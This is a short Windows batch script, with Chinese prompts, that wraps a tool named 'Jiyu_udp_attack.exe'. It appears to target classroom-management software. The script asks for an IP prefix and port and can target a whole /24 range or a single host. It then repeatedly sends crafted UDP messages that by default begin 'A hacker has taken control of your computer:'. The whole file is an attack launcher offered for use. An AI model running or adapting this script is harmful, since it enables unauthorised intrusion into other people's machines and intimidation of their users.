@echo off


set /p IP=IP:

set /p P=端口:

:loop

set /p H=发送范围(1=全网段,2=单IP):

if "%H%"=="1" goto :c

if "%H%"=="2" goto :b

:c
set MSG1=黑客控制了你的电脑：
set /p MSG1=发送提示:

set D=0-255

set /p MSG2=发送内容：

Jiyu_udp_attack.exe -ip %IP%%D% -p %P% -msg "%MSG1%%MSG2%"

goto :loop


:b

set /p D=详细接收者地址：

set MSG1=黑客控制了你的电脑：
set /p MSG1=发送提示:

set /p MSG2=发送内容：

Jiyu_udp_attack.exe -ip %IP%%D% -p %P% -msg "%MSG1%%MSG2%"


goto :loop
